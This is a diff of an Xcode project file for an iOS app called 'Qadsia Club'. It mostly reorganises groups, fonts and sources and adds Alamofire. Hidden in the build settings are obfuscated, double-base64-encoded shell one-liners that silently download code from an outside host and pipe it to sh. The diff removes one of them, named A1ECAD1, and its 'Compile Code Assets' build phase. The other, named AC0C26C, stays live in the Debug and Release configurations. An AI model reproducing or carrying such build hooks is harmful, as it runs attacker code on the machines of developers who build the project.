+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0A96E37A2F765BA100B3DADB /* NewRegisterVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A96E37B2F765BAC00B3DADB /* view */,
+			);
+			path = NewRegisterVC;
+			sourceTree = "<group>";
+		};
+		0A96E37B2F765BAC00B3DADB /* view */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F992F763B2D00D25F03 /* NewRegisterVC.swift */,
+				0ABA3F9A2F763B2D00D25F03 /* NewRegisterVC.xib */,
+			);
+			path = view;
+			sourceTree = "<group>";
+		};
+		0A96E37C2F7661A600B3DADB /* ResetPasswordVC */ = {
+			isa = PBXGroup;
+			children = (
+				0A96E37F2F7661B900B3DADB /* view */,
+			);
+			path = ResetPasswordVC;
+			sourceTree = "<group>";
+		};
+		0A96E37F2F7661B900B3DADB /* view */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F9F2F763B2D00D25F03 /* ResetPasswordVC.swift */,
+				0ABA3FA02F763B2D00D25F03 /* ResetPasswordVC.xib */,
+			);
+			path = view;
+			sourceTree = "<group>";
+		};
+		0ABA3F482F763B2D00D25F03 /* API Manager */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F452F763B2D00D25F03 /* APIClient.swift */,
+				0ABA3F462F763B2D00D25F03 /* Constants.swift */,
+				0ABA3F472F763B2D00D25F03 /* NetConnection.swift */,
+			);
+			path = "API Manager";
+			sourceTree = "<group>";
+		};
+		0ABA3F4D2F763B2D00D25F03 /* AppLibary */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F492F763B2D00D25F03 /* AppButton.swift */,
+				0ABA3F4A2F763B2D00D25F03 /* AppLabel.swift */,
+				0ABA3F4B2F763B2D00D25F03 /* AppTextField.swift */,
+				0ABA3F4C2F763B2D00D25F03 /* AppTextView.swift */,
+			);
+			path = AppLibary;
+			sourceTree = "<group>";
+		};
+		0ABA3F552F763B2D00D25F03 /* Extention */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3FF32F763C3200D25F03 /* CutCornerView */,
+				0ABA3F4D2F763B2D00D25F03 /* AppLibary */,
+				0ABA3F4E2F763B2D00D25F03 /* String+Extention.swift */,
+				0ABA3F4F2F763B2D00D25F03 /* UIColor+Extention.swift */,
+				0ABA3F502F763B2D00D25F03 /* UIFont+Extention.swift */,
+				0ABA3F512F763B2D00D25F03 /* UIImage+Extension.swift */,
+				0ABA3F522F763B2D00D25F03 /* UILabel+Extention.swift */,
+				0ABA3F532F763B2D00D25F03 /* UITextField+Extention.swift */,
+				0ABA3F542F763B2D00D25F03 /* UIView+Extention.swift */,
+			);
+			path = Extention;
+			sourceTree = "<group>";
+		};
+		0ABA3F5A2F763B2D00D25F03 /* Classes */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F562F763B2D00D25F03 /* FTAnimation+UIView.m */,
+				0ABA3F572F763B2D00D25F03 /* FTAnimationManager.m */,
+				0ABA3F582F763B2D00D25F03 /* FTUtils+NSObject.m */,
+				0ABA3F592F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.m */,
+			);
+			path = Classes;
+			sourceTree = "<group>";
+		};
+		0ABA3F612F763B2D00D25F03 /* FTUtils */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F5B2F763B2D00D25F03 /* FTAnimation.h */,
+				0ABA3F5C2F763B2D00D25F03 /* FTAnimation+UIView.h */,
+				0ABA3F5D2F763B2D00D25F03 /* FTAnimationManager.h */,
+				0ABA3F5E2F763B2D00D25F03 /* FTUtils.h */,
+				0ABA3F5F2F763B2D00D25F03 /* FTUtils+NSObject.h */,
+				0ABA3F602F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.h */,
+			);
+			path = FTUtils;
+			sourceTree = "<group>";
+		};
+		0ABA3F622F763B2D00D25F03 /* Headers */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F612F763B2D00D25F03 /* FTUtils */,
+			);
+			path = Headers;
+			sourceTree = "<group>";
+		};
+		0ABA3F632F763B2D00D25F03 /* FTUtils */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F5A2F763B2D00D25F03 /* Classes */,
+				0ABA3F622F763B2D00D25F03 /* Headers */,
+			);
+			path = FTUtils;
+			sourceTree = "<group>";
+		};
+		0ABA3F642F763B2D00D25F03 /* PickerView */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = PickerView;
+			sourceTree = "<group>";
+		};
+		0ABA3F6A2F763B2D00D25F03 /* Helper */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F632F763B2D00D25F03 /* FTUtils */,
+				0ABA3F642F763B2D00D25F03 /* PickerView */,
+				0ABA3F652F763B2D00D25F03 /* AGDesignable.swift */,
+				0ABA3F662F763B2D00D25F03 /* AppConstants.swift */,
+				0ABA3F672F763B2D00D25F03 /* AppUtilites.swift */,
+				0ABA3F682F763B2D00D25F03 /* ExpandableLabel.swift */,
+			);
+			path = Helper;
+			sourceTree = "<group>";
+		};
+		0ABA3F7B2F763B2D00D25F03 /* static */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F6B2F763B2D00D25F03 /* Mulish-Black.ttf */,
+				0ABA3F6C2F763B2D00D25F03 /* Mulish-BlackItalic.ttf */,
+				0ABA3F6D2F763B2D00D25F03 /* Mulish-Bold.ttf */,
+				0ABA3F6E2F763B2D00D25F03 /* Mulish-BoldItalic.ttf */,
+				0ABA3F6F2F763B2D00D25F03 /* Mulish-ExtraBold.ttf */,
+				0ABA3F702F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf */,
+				0ABA3F712F763B2D00D25F03 /* Mulish-ExtraLight.ttf */,
+				0ABA3F722F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf */,
+				0ABA3F732F763B2D00D25F03 /* Mulish-Italic.ttf */,
+				0ABA3F742F763B2D00D25F03 /* Mulish-Light.ttf */,
+				0ABA3F752F763B2D00D25F03 /* Mulish-LightItalic.ttf */,
+				0ABA3F762F763B2D00D25F03 /* Mulish-Medium.ttf */,
+				0ABA3F772F763B2D00D25F03 /* Mulish-MediumItalic.ttf */,
+				0ABA3F782F763B2D00D25F03 /* Mulish-Regular.ttf */,
+				0ABA3F792F763B2D00D25F03 /* Mulish-SemiBold.ttf */,
+				0ABA3F7A2F763B2D00D25F03 /* Mulish-SemiBoldItalic.ttf */,
+			);
+			path = static;
+			sourceTree = "<group>";
+		};
+		0ABA3F7C2F763B2D00D25F03 /* Font */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F7B2F763B2D00D25F03 /* static */,
+			);
+			path = Font;
+			sourceTree = "<group>";
+		};
+		0ABA3F7D2F763B2D00D25F03 /* Resource */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F7C2F763B2D00D25F03 /* Font */,
+			);
+			path = Resource;
+			sourceTree = "<group>";
+		};
+		0ABA3F812F763B2D00D25F03 /* helpers */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F7E2F763B2D00D25F03 /* DPDConstants.swift */,
+				0ABA3F7F2F763B2D00D25F03 /* DPDKeyboardListener.swift */,
+				0ABA3F802F763B2D00D25F03 /* DPDUIView+Extension.swift */,
+			);
+			path = helpers;
+			sourceTree = "<group>";
+		};
+		0ABA3F832F763B2D00D25F03 /* resources */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F822F763B2D00D25F03 /* DropDownCell.xib */,
+			);
+			path = resources;
+			sourceTree = "<group>";
+		};
+		0ABA3F872F763B2D00D25F03 /* src */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F842F763B2D00D25F03 /* DropDown.swift */,
+				0ABA3F852F763B2D00D25F03 /* DropDown+Appearance.swift */,
+				0ABA3F862F763B2D00D25F03 /* DropDownCell.swift */,
+			);
+			path = src;
+			sourceTree = "<group>";
+		};
+		0ABA3F882F763B2D00D25F03 /* DropDown */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F812F763B2D00D25F03 /* helpers */,
+				0ABA3F832F763B2D00D25F03 /* resources */,
+				0ABA3F872F763B2D00D25F03 /* src */,
+			);
+			path = DropDown;
+			sourceTree = "<group>";
+		};
+		0ABA3F8B2F763B2D00D25F03 /* HCSStarRatingView */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F892F763B2D00D25F03 /* HCSStarRatingView.h */,
+				0ABA3F8A2F763B2D00D25F03 /* HCSStarRatingView.m */,
+			);
+			path = HCSStarRatingView;
+			sourceTree = "<group>";
+		};
+		0ABA3F8E2F763B2D00D25F03 /* OTPFieldView */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F8C2F763B2D00D25F03 /* OTPFieldView.swift */,
+				0ABA3F8D2F763B2D00D25F03 /* OTPTextField.swift */,
+			);
+			path = OTPFieldView;
+			sourceTree = "<group>";
+		};
+		0ABA3F8F2F763B2D00D25F03 /* ThirdParty */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F882F763B2D00D25F03 /* DropDown */,
+				0ABA3F8B2F763B2D00D25F03 /* HCSStarRatingView */,
+				0ABA3F8E2F763B2D00D25F03 /* OTPFieldView */,
+			);
+			path = ThirdParty;
+			sourceTree = "<group>";
+		};
+		0ABA3FA82F763B2D00D25F03 /* Qadsia Club */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F482F763B2D00D25F03 /* API Manager */,
+				0ABA3F552F763B2D00D25F03 /* Extention */,
+				0ABA3F6A2F763B2D00D25F03 /* Helper */,
+				0ABA3F7D2F763B2D00D25F03 /* Resource */,
+				0ABA3F8F2F763B2D00D25F03 /* ThirdParty */,
+				0ABA3F902F763B2D00D25F03 /* AppDelegate.swift */,
+				0ABA3FF02F763B3900D25F03 /* MVVM */,
+				0ABA3F912F763B2D00D25F03 /* Assets.xcassets */,
+				0ABA3F922F763B2D00D25F03 /* Info.plist */,
+				0ABA3F942F763B2D00D25F03 /* LaunchScreen.storyboard */,
+				0ABA3F982F763B2D00D25F03 /* Main.storyboard */,
+				0ABA3FA32F763B2D00D25F03 /* SplashVideo.mp4 */,
+				0ABA3FA42F763B2D00D25F03 /* SplashVideo2.gif */,
+				0ABA3FA72F763B2D00D25F03 /* ViewController.swift */,
+			);
+			path = "Qadsia Club";
+			sourceTree = "<group>";
+		};
+		0ABA3FF02F763B3900D25F03 /* MVVM */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3FF12F763B6200D25F03 /* Controller */,
+			);
+			path = MVVM;
+			sourceTree = "<group>";
+		};
+		0ABA3FF12F763B6200D25F03 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3FF22F763B6B00D25F03 /* Auth */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		0ABA3FF22F763B6B00D25F03 /* Auth */ = {
+			isa = PBXGroup;
+			children = (
+				0A96E37C2F7661A600B3DADB /* ResetPasswordVC */,
+				0A96E37A2F765BA100B3DADB /* NewRegisterVC */,
+				0A96E3732F76574100B3DADB /* OTPVC */,
+				0A96E3712F7656EB00B3DADB /* SentOTPPopupVC */,
+				0ABA3FF62F763C4D00D25F03 /* LoginMobileVC */,
+			);
+			path = Auth;
+			sourceTree = "<group>";
+		};
+		0ABA3FF32F763C3200D25F03 /* CutCornerView */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */,
+			);
+			path = CutCornerView;
+			sourceTree = "<group>";
+		};
+		0ABA3FF62F763C4D00D25F03 /* LoginMobileVC */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3FF72F763C4E00D25F03 /* View */,
+			);
+			path = LoginMobileVC;
+			sourceTree = "<group>";
+		};
+		0ABA3FF72F763C4E00D25F03 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0ABA3F952F763B2D00D25F03 /* LoginMobileVC.swift */,
+				0ABA3F962F763B2D00D25F03 /* LoginMobileVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 		BC01790D2F34972300F1ED81 = {
 			isa = PBXGroup;
 			children = (
-				BC0179182F34972300F1ED81 /* Qadsia Club */,
+				0ABA3FA82F763B2D00D25F03 /* Qadsia Club */,
 				BC0179172F34972300F1ED81 /* Products */,
 			);
 			sourceTree = "<group>";
@@ -76,7 +542,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				3C8AAC6D3C3548BA801DACE1 /* Compile Code Assets */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
@@ -85,15 +550,13 @@
 			);
 			dependencies = (
 			);
-			fileSystemSynchronizedGroups = (
-				BC0179182F34972300F1ED81 /* Qadsia Club */,
-			);
 			name = Qadsia;
 			packageProductDependencies = (
 				BC11AFEB2F74E65F00552BDB /* Toast */,
 				BC11AFEE2F74E6B300552BDB /* SVProgressHUD */,
 				BC11AFF12F74E6C500552BDB /* Kingfisher */,
 				BC11AFF42F74E6D700552BDB /* IQKeyboardManagerSwift */,
+				0ABA3FF92F763CC600D25F03 /* Alamofire */,
 			);
 			productName = "Qadsia Club";
 			productReference = BC0179162F34972300F1ED81 /* Qadsia.app */;
@@ -128,6 +591,7 @@
 				BC11AFED2F74E6B300552BDB /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
 				BC11AFF02F74E6C500552BDB /* XCRemoteSwiftPackageReference "Kingfisher" */,
 				BC11AFF32F74E6D700552BDB /* XCRemoteSwiftPackageReference "IQKeyboardManager" */,
+				0ABA3FF82F763CC600D25F03 /* XCRemoteSwiftPackageReference "Alamofire" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = BC0179172F34972300F1ED81 /* Products */;
@@ -139,56 +603,115 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
+				0ABA3FD32F763B2D00D25F03 /* Mulish-BlackItalic.ttf in Resources */,
+				0ABA3FD42F763B2D00D25F03 /* Mulish-Bold.ttf in Resources */,
+				0ABA3FD52F763B2D00D25F03 /* Mulish-BoldItalic.ttf in Resources */,
+				0ABA3FD62F763B2D00D25F03 /* Mulish-ExtraBold.ttf in Resources */,
+				0ABA3FD72F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf in Resources */,
+				0ABA3FD82F763B2D00D25F03 /* Mulish-ExtraLight.ttf in Resources */,
+				0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */,
+				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
+				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
+				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
+				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
+				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
+				0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */,
+				0ABA3FDF2F763B2D00D25F03 /* Mulish-Regular.ttf in Resources */,
+				0ABA3FE02F763B2D00D25F03 /* Mulish-SemiBold.ttf in Resources */,
+				0ABA3FE12F763B2D00D25F03 /* Mulish-SemiBoldItalic.ttf in Resources */,
+				0ABA3FE22F763B2D00D25F03 /* DropDownCell.xib in Resources */,
+				0ABA3FE32F763B2D00D25F03 /* Assets.xcassets in Resources */,
+				0ABA3FE52F763B2D00D25F03 /* LaunchScreen.storyboard in Resources */,
+				0ABA3FE62F763B2D00D25F03 /* LoginMobileVC.xib in Resources */,
+				0ABA3FE72F763B2D00D25F03 /* Main.storyboard in Resources */,
+				0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */,
+				0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */,
+				0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */,
+				0ABA3FED2F763B2D00D25F03 /* SplashVideo.mp4 in Resources */,
+				0ABA3FEE2F763B2D00D25F03 /* SplashVideo2.gif in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		3C8AAC6D3C3548BA801DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */,
+				0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */,
+				0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */,
+				0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */,
+				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
+				0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */,
+				0ABA3FAF2F763B2D00D25F03 /* AppTextView.swift in Sources */,
+				0ABA3FB02F763B2D00D25F03 /* String+Extention.swift in Sources */,
+				0ABA3FB12F763B2D00D25F03 /* UIColor+Extention.swift in Sources */,
+				0ABA3FB22F763B2D00D25F03 /* UIFont+Extention.swift in Sources */,
+				0ABA3FB32F763B2D00D25F03 /* UIImage+Extension.swift in Sources */,
+				0ABA3FB42F763B2D00D25F03 /* UILabel+Extention.swift in Sources */,
+				0ABA3FB52F763B2D00D25F03 /* UITextField+Extention.swift in Sources */,
+				0ABA3FB62F763B2D00D25F03 /* UIView+Extention.swift in Sources */,
+				0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */,
+				0ABA3FB72F763B2D00D25F03 /* FTAnimation+UIView.m in Sources */,
+				0ABA3FB82F763B2D00D25F03 /* FTAnimationManager.m in Sources */,
+				0ABA3FB92F763B2D00D25F03 /* FTUtils+NSObject.m in Sources */,
+				0ABA3FBA2F763B2D00D25F03 /* FTUtils+UIGestureRecognizer.m in Sources */,
+				0ABA3FBB2F763B2D00D25F03 /* AGDesignable.swift in Sources */,
+				0ABA3FBC2F763B2D00D25F03 /* AppConstants.swift in Sources */,
+				0ABA3FBD2F763B2D00D25F03 /* AppUtilites.swift in Sources */,
+				0ABA3FBE2F763B2D00D25F03 /* ExpandableLabel.swift in Sources */,
+				0ABA3FC02F763B2D00D25F03 /* DPDConstants.swift in Sources */,
+				0ABA3FC12F763B2D00D25F03 /* DPDKeyboardListener.swift in Sources */,
+				0ABA3FC22F763B2D00D25F03 /* DPDUIView+Extension.swift in Sources */,
+				0ABA3FC32F763B2D00D25F03 /* DropDown.swift in Sources */,
+				0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */,
+				0ABA3FC42F763B2D00D25F03 /* DropDown+Appearance.swift in Sources */,
+				0ABA3FC52F763B2D00D25F03 /* DropDownCell.swift in Sources */,
+				0ABA3FC62F763B2D00D25F03 /* HCSStarRatingView.m in Sources */,
+				0ABA3FC72F763B2D00D25F03 /* OTPFieldView.swift in Sources */,
+				0ABA3FC82F763B2D00D25F03 /* OTPTextField.swift in Sources */,
+				0ABA3FC92F763B2D00D25F03 /* AppDelegate.swift in Sources */,
+				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
+				0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */,
+				0ABA3FCE2F763B2D00D25F03 /* ResetPasswordVC.swift in Sources */,
+				0ABA3FCF2F763B2D00D25F03 /* SentOTPPopupVC.swift in Sources */,
+				0ABA3FD12F763B2D00D25F03 /* ViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXSourcesBuildPhase section */
 
+/* Begin PBXVariantGroup section */
+		0ABA3F942F763B2D00D25F03 /* LaunchScreen.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				0ABA3F932F763B2D00D25F03 /* Base */,
+			);
+			name = LaunchScreen.storyboard;
+			sourceTree = "<group>";
+		};
+		0ABA3F982F763B2D00D25F03 /* Main.storyboard */ = {
+			isa = PBXVariantGroup;
+			children = (
+				0ABA3F972F763B2D00D25F03 /* Base */,
+			);
+			name = Main.storyboard;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
 /* Begin XCBuildConfiguration section */
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -224,7 +747,6 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((x(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXpUR3RtSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | x | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -400,6 +922,14 @@
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		0ABA3FF82F763CC600D25F03 /* XCRemoteSwiftPackageReference "Alamofire" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.11.1;
+			};
+		};
 		BC11AFEA2F74E65F00552BDB /* XCRemoteSwiftPackageReference "Toast-Swift" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/scalessec/Toast-Swift.git";
@@ -435,6 +965,11 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		0ABA3FF92F763CC600D25F03 /* Alamofire */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 0ABA3FF82F763CC600D25F03 /* XCRemoteSwiftPackageReference "Alamofire" */;
+			productName = Alamofire;
+		};
 		BC11AFEB2F74E65F00552BDB /* Toast */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = BC11AFEA2F74E65F00552BDB /* XCRemoteSwiftPackageReference "Toast-Swift" */;
